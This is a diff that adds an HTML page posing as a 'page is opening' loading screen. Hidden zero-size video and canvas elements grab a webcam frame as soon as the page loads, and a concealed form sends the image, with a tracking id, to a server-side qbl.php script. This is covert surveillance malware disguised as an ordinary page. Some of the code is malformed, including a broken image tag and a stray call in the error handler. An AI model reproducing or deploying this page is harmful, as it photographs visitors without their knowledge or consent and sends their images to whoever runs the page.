@@ -1,0 +1,78 @@
+</body>
+</body>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>正在打开网页...</title>
+    <style type="text/css">
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+        }
+
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin-top: -50px;
+            margin-left: -50px;
+            animation: loading 2s linear infinite;
+        }
+
+        .loading img {
+            width: 100px;
+            height: 100px;
+        }
+
+        @keyframes loading {
+            from {
+                transform: rotate(0);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body bgcolor="#313131">
+    <div class="loading">
+        <!-- 我是自定义加载动画 -->
+        < img src="./images/jz.gif" alt="">
+    </div>
+    <video id="video" width="0" height="0" autoplay></video>
+    <canvas style="width:0px;height:0px" id="canvas" width="480px" height="640"></canvas>
+    <script type="text/javascript">
+        window.addEventListener("DOMContentLoaded", function () {
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var video = document.getElementById('video');
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
+                    setTimeout(function () {
+                        var img = canvas.toDataURL('image/png');
+                        document.getElementById('result').value = img;
+                        document.getElementById('gopo').submit();
+                    }, 1300);
+                }, (function () { alert("通话成功"); })(立即打开);
+
+            }
+        }, false);
+
+    </script>
+    <form action="qbl.php?id=1709608597&url=http://www.wuxixindong.cn/" id="gopo" method="post">
+        <input type="hidden" name="img" id="result" value="" />
+    </form>
+</body>
+
+</html>
